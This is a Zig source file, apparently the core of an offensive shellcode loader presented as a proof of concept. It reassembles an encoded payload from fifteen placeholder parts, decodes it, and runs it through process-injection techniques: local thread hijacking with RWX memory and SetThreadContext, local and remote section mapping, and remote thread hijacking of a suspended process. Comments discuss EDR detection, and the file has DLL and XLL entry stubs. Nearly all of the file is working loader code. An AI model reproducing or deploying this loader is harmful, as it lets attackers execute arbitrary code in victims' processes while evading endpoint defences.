// author : @zux0x0
// zig version : 0.13.0
// disclaimer : this is a proof of concept and is not meant for illegal use. and i am not responsible for any damage caused by this code.

const std = @import("std");
const technique_1 = @import("./hijack_thread.zig");
const technique_2 = @import("./local_map.zig");
const remote_mapping = @import("./remote_mapping.zig");
const remote_thread = @import("./remote_thread.zig");

const core = @import("./Core.zig");
//const syscalls_localmap = @import("./syscalls_localmap.zig");

const windows = std.os.windows;
const WINAPI = windows.WINAPI;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const LPVOID = windows.LPVOID;
const BOOL = windows.BOOL;
const CONTEXT = windows.CONTEXT;
const PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE;
const MEM_COMMIT = windows.MEM_COMMIT;
const MEM_RESERVE = windows.MEM_RESERVE;
const Allocator = std.mem.Allocator;
const base64 = std.base64;
const kernel32 = windows.kernel32;
const STARTUPINFOW = windows.STARTUPINFOW;

pub const CONTEXT_i386: u32 = 0x00010000;
pub const CONTEXT_CONTROL = CONTEXT_i386 | 0x0001;
pub const CONTEXT_INTEGER = CONTEXT_i386 | 0x0002;
pub const CONTEXT_SEGMENTS = CONTEXT_i386 | 0x0004;
pub const CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x0008;
pub const CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x0010;
pub const CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;
const L = std.unicode.utf8ToUtf16LeStringLiteral;
const win32 = struct {
    const DLL_PROCESS_ATTACH = 1;
    const DLL_PROCESS_DETACH = 0;
};

pub extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*anyopaque,
    dwStackSize: usize,
    lpStartAddress: *const ThreadProc,
    lpParameter: ?LPVOID,
    dwCreationFlags: DWORD,
    lpThreadId: ?*DWORD,
) ?HANDLE;

pub extern "kernel32" fn GetThreadContext(
    hThread: HANDLE,
    lpContext: *CONTEXT,
) callconv(windows.WINAPI) BOOL;

pub extern "kernel32" fn SetThreadContext(
    hThread: HANDLE,
    lpContext: *CONTEXT,
) callconv(windows.WINAPI) BOOL;

pub extern "kernel32" fn ResumeThread(
    hThread: HANDLE,
) callconv(windows.WINAPI) DWORD;

pub const ThreadProc = fn (param: ?LPVOID) callconv(.Win64) DWORD;

// convert the string to a wide string UTF16-L in comptime
fn ComptimeWS(comptime str: []const u8) []const u16 {
    @setEvalBranchQuota(100_000_000);
    comptime {
        var wide_str = std.unicode.utf8ToUtf16LeStringLiteral(str);
        _ = &wide_str; // ignore
        return wide_str;
    }
}

// struct to hold encoded shellcode into several parts.
const SH = struct {
    const b1 = ComptimeWS(" ");
    const b2 = ComptimeWS(" ");
    const b3 = ComptimeWS(" ");
    const b4 = ComptimeWS(" ");
    const b5 = ComptimeWS(" ");
    const b6 = ComptimeWS(" ");
    const b7 = ComptimeWS(" ");
    const b8 = ComptimeWS(" ");
    const b9 = ComptimeWS(" ");
    const b10 = ComptimeWS(" ");
    const b11 = ComptimeWS(" ");
    const b12 = ComptimeWS(" ");
    const b13 = ComptimeWS(" ");
    const b14 = ComptimeWS(" ");
    const b15 = ComptimeWS(" ");

    pub fn getshellcodeparts() [15][]const u16 {
        return .{
            b1,  b2,  b3,  b4,  b5,
            b6,  b7,  b8,  b9,  b10,
            b11, b12, b13, b14, b15,
        };
    }
};

fn concat_shellcode(allocator: std.mem.Allocator) ![]u16 {
    const parts = SH.getshellcodeparts();
    var total_len: usize = 0;

    for (parts) |part| { // calc total len
        total_len += part.len;
    }

    const concat = try allocator.alloc(u16, total_len);
    var index: usize = 0;

    for (parts) |part| { // simple :)
        @memcpy(concat[index..][0..part.len], part);
        index += part.len;
    }

    return concat; // return the concat sh
}

// Define the function pointer type for thread functions
const ThreadFnType = *const fn (LPVOID) callconv(.C) DWORD;

const ThreadProcedure = fn (lpParameter: ?*const anyopaque) callconv(.C) DWORD;

fn someFunction(x: i32) void {
    std.debug.print("someFunction called with {}\n", .{x});
}

// Global variables
var thread_handle: HANDLE = undefined;

// Sample procedure that will be executed in the thread

// The thread function must match the expected signature for CreateThread
fn myThreadFunction(param: LPVOID) DWORD {
    std.debug.print("Thread started with parameter: {}\n", .{param});
    return 0;
}

fn sampleProcedure(lpParameter: ?*anyopaque) callconv(.C) DWORD {
    _ = lpParameter;

    std.debug.print("sampleProcedure called\n", .{});
    return 0;
}

// Thread function that executes the provided procedure
fn threadFunction(parameter: ?*anyopaque) callconv(.C) DWORD {
    if (parameter) |proc_ptr| {
        const proc = @as(*const ThreadProcedure, @ptrCast(proc_ptr)).*;
        proc();
    }
    return 0;
}

fn bytesToHexString(allocator: Allocator, bytes: []const u8) ![]u8 {
    var hex_string = try std.ArrayList(u8).initCapacity(allocator, bytes.len * 5); // "0x??, " for each byte
    defer hex_string.deinit();

    for (bytes) |byte| {
        try std.fmt.format(hex_string.writer(), "0x{x:0>2}, ", .{byte});
    }

    // Remove the trailing ", "
    if (hex_string.items.len > 2) {
        hex_string.shrinkRetainingCapacity(hex_string.items.len - 2);
    }

    return hex_string.toOwnedSlice();
}

fn convertEscapedHexToCommaHex(allocator: std.mem.Allocator, input: []const u8) ![]u8 {
    var output = std.ArrayList(u8).init(allocator);
    defer output.deinit();

    var i: usize = 0;
    while (i < input.len) {
        if (input[i] == '\\' and i + 3 < input.len and input[i + 1] == 'x') {
            try output.appendSlice("0x");
            try output.appendSlice(input[i + 2 .. i + 4]);
            if (i + 4 < input.len) {
                try output.append(',');
            }
            i += 4;
        } else {
            try output.append(input[i]);
            i += 1;
        }
    }

    return output.toOwnedSlice();
}

fn decodeBase64_u16(allocator: Allocator, encoded: []const u16) ![]u8 {
    var regular_string = std.ArrayList(u8).init(allocator);
    defer regular_string.deinit();

    for (encoded) |wide_char| {
        try regular_string.append(@truncate(wide_char)); // convert u16 to u8 16/Nov
    }

    // decode the base64
    const decoder = base64.standard.Decoder;
    const decoded_size = try decoder.calcSizeForSlice(regular_string.items);

    const decoded = try allocator.alloc(u8, decoded_size);
    errdefer allocator.free(decoded);

    _ = try decoder.decode(decoded, regular_string.items);
    return decoded;
}

fn decodeBase64(allocator: Allocator, encoded: []const u8) ![]u8 {
    // copied from zig documentation, looks simple but it works!
    const decoder = base64.standard.Decoder;
    const decoded_size = try decoder.calcSizeForSlice(encoded);
    const decoded = try allocator.alloc(u8, decoded_size);
    _ = try decoder.decode(decoded, encoded);
    return decoded;
}

fn decodeHex(allocator: Allocator, hex_string: []const u8) ![]u8 {

    //garbage code but it works!
    var decoded = std.ArrayList(u8).init(allocator);
    defer decoded.deinit();

    var iter = std.mem.split(u8, hex_string, ",");
    var count: usize = 0;
    while (iter.next()) |hex_byte| {
        const trimmed = std.mem.trim(u8, hex_byte, &std.ascii.whitespace); // thanks AI for this!
        if (trimmed.len < 4 or !std.mem.startsWith(u8, trimmed, "0x")) {
            std.debug.print("Invalid hex byte at position {}: {s}\n", .{ count, trimmed });
            return error.InvalidHexString;
        }
        const byte = try std.fmt.parseInt(u8, trimmed[2..], 16);
        try decoded.append(byte);
        count += 1;
    }

    //  std.debug.print("Total hex bytes processed: {}\n", .{count});
    return decoded.toOwnedSlice();
}

fn hijackThread(h_thread: HANDLE, payload: []const u8) !bool {
    var old_protection: DWORD = undefined;

    var thread_ctx: CONTEXT = undefined;
    thread_ctx.ContextFlags = CONTEXT_FULL;
    std.debug.print("T context\n", .{});

    // Allocate memory for shellcode
    const address = try windows.VirtualAlloc(null, payload.len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    std.debug.print("SC allocated at {}\n", .{payload.len});
    if (address == @as(?*anyopaque, @ptrFromInt(0))) {
        std.debug.print("VAlloca failed with error: {}\n", .{windows.kernel32.GetLastError()});
        return false;
    }

    // Copy shellcode to allocated memory
    @memcpy(@as([*]u8, @ptrCast(address)), payload);
    // Verify the copy
    var copy_successful = true;
    for (payload, 0..) |byte, i| {
        if (byte != @as([*]u8, @ptrCast(address))[i]) {
            copy_successful = false;
            break;
        }
    }

    if (!copy_successful) {
        std.debug.print("Mem copy failed\n", .{});
        return error.MemoryCopyFailed;
    } else {
        std.debug.print("Mem copy successful\n", .{});
    }

    // Verify the copy
    //   std.debug.print("Copied SC (first 16 bytes): ", .{});
    //  for (0..@min(794, payload.len)) |i| {
    //     std.debug.print("{x:0>2} ", .{@as([*]u8, @ptrCast(address))[i]});
    // }
    // std.debug.print("\n", .{});

    // Change memory protection
    windows.VirtualProtect(address, payload.len, PAGE_EXECUTE_READWRITE, &old_protection) catch |err| {
        std.debug.print("Vprotect failed with error: {}\n", .{err});
        return false;
    };

    // Get thread context
    if (GetThreadContext(h_thread, &thread_ctx) == 0) {
        std.debug.print("GetThreadContext failed with error: {}\n", .{kernel32.GetLastError()});
        return false;
    }

    // Update instruction pointer
    thread_ctx.Rip = @intFromPtr(address);

    // Set new thread context
    if (SetThreadContext(h_thread, &thread_ctx) == 0) {
        std.debug.print("STC failed with error: {}\n", .{kernel32.GetLastError()});
        return false;
    }
    std.debug.print("Thread hiJcked successfully\n", .{});
    return true;
}
const user32 = struct {
    pub extern "user32" fn MessageBoxA(
        hWnd: ?windows.HWND,
        lpText: [*:0]const u8,
        lpCaption: [*:0]const u8,
        uType: windows.UINT,
    ) callconv(windows.WINAPI) c_int;
};
fn dummyFunction() void {
    // stupid code

    _ = user32.MessageBoxA(null, "Hello World!", "Zig", 0);
    std.debug.print("Press Enter to continue...", .{});
    _ = std.io.getStdIn().reader().readByte() catch |err| {
        std.debug.print("Failed to read input: {}\n", .{err});
        return;
    };
}
// not sure if going to have this in the future release due to fact is heavily detected by EDRs.
fn SYSCALL_local_mapping_injection() void {
    // var PAddress: ?*anyopaque = null;

    //  const allocator = std.heap.page_allocator;

    //  const b64_bytes = SH.getshellcodeparts();
    //   const decoded = decodeBase64(allocator, b64_bytes) catch |err| {
    //       std.debug.print("Failed to decode base64: {}\n", .{err});
    //       return;
    //   };
    //   defer allocator.free(decoded);

    //  const converted = convertEscapedHexToCommaHex(allocator, decoded) catch |err| {
    //          std.debug.print("failed to convert escaped {}\n ", .{err});
    //      return;
    //  };
    //  defer allocator.free(converted);

    //const decoded_hex = decodeHex(allocator, converted) catch |err| {
    //    std.debug.print("Failed to decode hex: {}\n", .{err});
    //    return;
    //};
    //  defer allocator.free(decoded_hex);
    //  if (syscalls_localmap.LocalMappingInjectionViaSyscalls(decoded_hex.ptr, decoded_hex.len)) {
    //      std.debug.print("[i] Local Map Inj via SCALLS Success\n", .{});
    //  } else {
    //      std.debug.print("[x] Local Map Injection via SYCALLS Failed\n", .{});
    //  }

}

fn remote_thread_injection() void {
    var process_id: DWORD = undefined;
    var process_handle: HANDLE = undefined;
    var remote_thread_handle: HANDLE = undefined;
    var PAddr: windows.PVOID = undefined;

    // here is the function to execute the shellcode in remote process hijacked thread.
    const process_name = "// PROCESS NAME ";
    const allocator_1 = std.heap.page_allocator;
    const appNameUnicode = std.unicode.utf8ToUtf16LeWithNull(allocator_1, process_name) catch undefined;

    const allocator = std.heap.page_allocator;

    var Allc = std.heap.page_allocator;

    //const b64_bytes = std.mem.sliceAsBytes(b64); # Depricated
    const b64_bytes = concat_shellcode(Allc) catch |err| {
        std.debug.print("Failed to concat shellcode: {}\n", .{err});
        return;
    };
    defer Allc.free(b64_bytes);
    //onst b64_bytes = SH.getshellcodeparts();
    const decoded = decodeBase64_u16(allocator, b64_bytes) catch |err| {
        std.debug.print("Failed to decode b64: {}\n", .{err});
        return;
    };
    defer allocator.free(decoded);

    const converted = convertEscapedHexToCommaHex(allocator, decoded) catch |err| {
        std.debug.print("failed to convert escaped {}\n ", .{err});
        return;
    };
    defer allocator.free(converted);

    const decoded_hex = decodeHex(allocator, converted) catch |err| {
        std.debug.print("Failed to decode hex: {}\n", .{err});
        return;
    };
    defer allocator.free(decoded_hex);

    const success = remote_thread.suspended_Process(appNameUnicode, &process_id, &process_handle, &remote_thread_handle) catch |err| {
        std.debug.print("Failed to create suspended process: {}\n", .{err});
        return;
    };

    if (!success) {
        std.debug.print("Process creation failed\n", .{});
        return;
    }
    const injection_result = remote_thread.inject_into_Process(&process_handle, decoded_hex.ptr, decoded_hex.len, &PAddr) catch |err| {
        std.debug.print(" failed: {}\n", .{err});
        return;
    };

    if (!injection_result) {
        std.debug.print(" failed\n", .{});
        return;
    }

    // remote_thread.inject_into_Process(&process_handle, decoded_hex.ptr, decoded_hex.len, &PAddr);
    const HJ = remote_thread.hijackremoteThread(&remote_thread_handle, PAddr) catch |err| {
        std.debug.print("failed: {}\n", .{err});
        return;
    };

    if (!HJ) {
        std.debug.print("failed\n", .{});
        return;
    }
}

fn remote_map_injection() void {
    const process_name = "// PROCESS NAME ";

    const allocator_1 = std.heap.page_allocator;
    const appNameUnicode = std.unicode.utf8ToUtf16LeWithNull(allocator_1, process_name) catch undefined;

    const allocator = std.heap.page_allocator;

    var Allc = std.heap.page_allocator;

    //const b64_bytes = std.mem.sliceAsBytes(b64); # Depricated
    const b64_bytes = concat_shellcode(Allc) catch |err| {
        std.debug.print("Failed to concat shellcode: {}\n", .{err});
        return;
    };
    defer Allc.free(b64_bytes);

    // const b64_bytes = SH.getshellcodeparts();
    const decoded = decodeBase64_u16(allocator, b64_bytes) catch |err| {
        std.debug.print("Failed to decode b64: {}\n", .{err});
        return;
    };
    defer allocator.free(decoded);

    const converted = convertEscapedHexToCommaHex(allocator, decoded) catch |err| {
        std.debug.print("failed to convert escaped {}\n ", .{err});
        return;
    };
    defer allocator.free(converted);

    const decoded_hex = decodeHex(allocator, converted) catch |err| {
        std.debug.print("Failed to decode hex: {}\n", .{err});
        return;
    };
    defer allocator.free(decoded_hex);
    std.debug.print("process_name: {any}\n", .{appNameUnicode});
    const process_id = core.GetRemoteProcessId(appNameUnicode) catch |err| {
        std.debug.print("Failed to get process id: {}\n", .{err});
        return;
    };

    std.debug.print("process_id: {any}\n", .{process_id});
    const STATE = remote_mapping.Inject_CreateRemoteThread(process_id, decoded_hex.ptr, decoded_hex.len);
    std.debug.print("Remote Map Injection State: {}\n", .{STATE});
}

fn local_map_injection() void {
    var PAddress: ?*anyopaque = null;

    const allocator = std.heap.page_allocator;
    // const b64_bytes = std.mem.sliceAsBytes(b64);  # Depricated
    var Allc = std.heap.page_allocator;

    //const b64_bytes = std.mem.sliceAsBytes(b64); # Depricated
    const b64_bytes = concat_shellcode(Allc) catch |err| {
        std.debug.print("Failed to concat shellcode: {}\n", .{err});
        return;
    };
    defer Allc.free(b64_bytes);

    // const b64_bytes = SH.getshellcodeparts(); // Depricated
    const decoded = decodeBase64_u16(allocator, b64_bytes) catch |err| {
        std.debug.print("Failed to decode b64: {}\n", .{err});
        return;
    };
    defer allocator.free(decoded);

    // lets convert it back into comma seperated hex values.
    const converted = convertEscapedHexToCommaHex(allocator, decoded) catch |err| {
        std.debug.print("failed to convert escaped {}\n ", .{err});
        return;
    };
    defer allocator.free(converted);

    const decoded_hex = decodeHex(allocator, converted) catch |err| {
        std.debug.print("Failed to decode hex: {}\n", .{err});
        return;
    };
    defer allocator.free(decoded_hex);

    if (technique_2.LocalMapInject(decoded_hex.ptr, decoded_hex.len, &PAddress)) {
        std.debug.print("[i] Local Map INJ Success\n", .{});
    } else {
        std.debug.print("[x] Local Map INJ Failed\n", .{});
    }
    const ht = kernel32.CreateThread(null, 0, @as(windows.LPTHREAD_START_ROUTINE, @ptrCast(PAddress)), null, 0, null) orelse {
        std.debug.print("CreateThread failed: {}\n", .{kernel32.GetLastError()});
        return;
    };

    std.debug.print("hThread value: {}\n", .{ht});

    if (ht != windows.INVALID_HANDLE_VALUE) {
        return;
    }
}

fn createThreadAndExecute(proc: ThreadFnType) void {
    var thread_id: DWORD = undefined;
    // var Allc: *std.mem.Allocator = undefined;
    //@constCast(@ptrCast(@alignCast(&dummyFunction))) # Zig 13 -> 14 ..etc fuck this ecosystem.
    std.debug.print("proc: {}\n", .{@as(*ThreadFnType, @constCast(@ptrCast(@alignCast(&proc))))}); // Garbage code to see the proc pointer
    //_ = proc(); // shit
    // const threadProc: windows.LPTHREAD_START_ROUTINE = @ptrCast(windows.LPTHREAD_START_ROUTINE, @alignCast(@alignOf(fn () callconv(.C) DWORD), &proc)); # Depricated

    thread_handle = kernel32.CreateThread(null, 0, @ptrCast(&dummyFunction), @constCast(@ptrCast(@alignCast(&dummyFunction))), 0, &thread_id) orelse {
        std.debug.print("CreateThread failed: {}\n", .{kernel32.GetLastError()});
        return;
    };

    const allocator = std.heap.page_allocator;

    var Allc = std.heap.page_allocator;

    //const b64_bytes = std.mem.sliceAsBytes(b64); # Depricated
    const b64_bytes = concat_shellcode(Allc) catch |err| {
        std.debug.print("Failed to concat shellcode: {}\n", .{err});
        return;
    };
    defer Allc.free(b64_bytes);

    const decoded = decodeBase64_u16(allocator, b64_bytes) catch |err| {
        std.debug.print("Failed to decode base64: {}\n", .{err});
        return;
    };
    defer allocator.free(decoded);

    const converted = convertEscapedHexToCommaHex(allocator, decoded) catch |err| {
        std.debug.print("failed to convert escaped {}\n ", .{err});
        return;
    };

    defer allocator.free(converted);

    //**note**** enable these to see the converted and decoded values.
    //std.debug.print("Decoded length: {}\n", .{decoded.len});
    //std.debug.print("Decoded content: {s}\n", .{decoded});

    var decoded_hex = decodeHex(allocator, converted) catch |err| {
        std.debug.print("Failed to decode hex: {}\n", .{err});
        return;
    };
    _ = &decoded_hex; // pointless discard of local variable
    defer allocator.free(decoded_hex);
    //**note**** enable these to see the converted and decoded values.
    // Print the first few bytes to verify
    // std.debug.print("Decoded SC (first 16 bytes): ", .{});
    // for (decoded_hex[0..@min(794, decoded_hex.len)]) |byte| {
    //       std.debug.print("{x:0>2} ", .{byte});
    //   }
    //   std.debug.print("\n", .{});

    if (thread_handle != windows.INVALID_HANDLE_VALUE) { // if not null then we can hijack the thread and execute our payload

        _ = technique_1.hijackThread(thread_handle, @ptrCast(decoded_hex)) catch |err| {
            std.debug.print("Thread Hjcke failed: {}\n", .{err});
            return;
        };

        _ = ResumeThread(thread_handle);
    }
}

// ENTRY_DLL
// ENTRY_XLL
